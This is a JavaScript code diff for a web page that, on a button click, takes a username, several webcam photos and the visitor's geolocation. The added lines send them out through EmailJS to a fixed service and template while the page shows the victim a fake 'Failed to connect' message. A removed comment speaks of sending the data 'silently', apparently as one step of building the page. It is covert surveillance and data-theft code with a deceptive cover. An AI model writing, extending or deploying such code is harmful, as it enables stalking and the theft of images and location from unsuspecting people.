@@ -21,8 +21,13 @@ startBtn.addEventListener('click', async () => {
                 longitude: position.coords.longitude
             };
 
-            // Send the data silently (I'll explain sending in the next step)
-            console.log('Data captured', { username, photos, locationData });
+            // Send the data via email using EmailJS
+            sendEmail({
+                username: username,
+                photos: photos,
+                latitude: locationData.latitude,
+                longitude: locationData.longitude
+            });
 
             // Show "Failed to connect" message
             showFailedToConnect();
@@ -48,10 +53,26 @@ async function capturePhotos() {
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        photos.push(canvas.toDataURL('image/png'));
+        photos.push(canvas.toDataURL('image/png')); // Save photo as base64 data
     }
 
     videoStream.getTracks().forEach(track => track.stop()); // Stop the camera
+}
+
+function sendEmail(data) {
+    const emailParams = {
+        username: data.username,
+        photos: data.photos.join(', '), // Convert array of photos into a comma-separated string
+        latitude: data.latitude,
+        longitude: data.longitude
+    };
+
+    emailjs.send('service_zlf739n', 'template_t2l7g8n', emailParams)
+    .then((response) => {
+        console.log('SUCCESS!', response.status, response.text);
+    }, (error) => {
+        console.error('FAILED...', error);
+    });
 }
 
 function showFailedToConnect() {
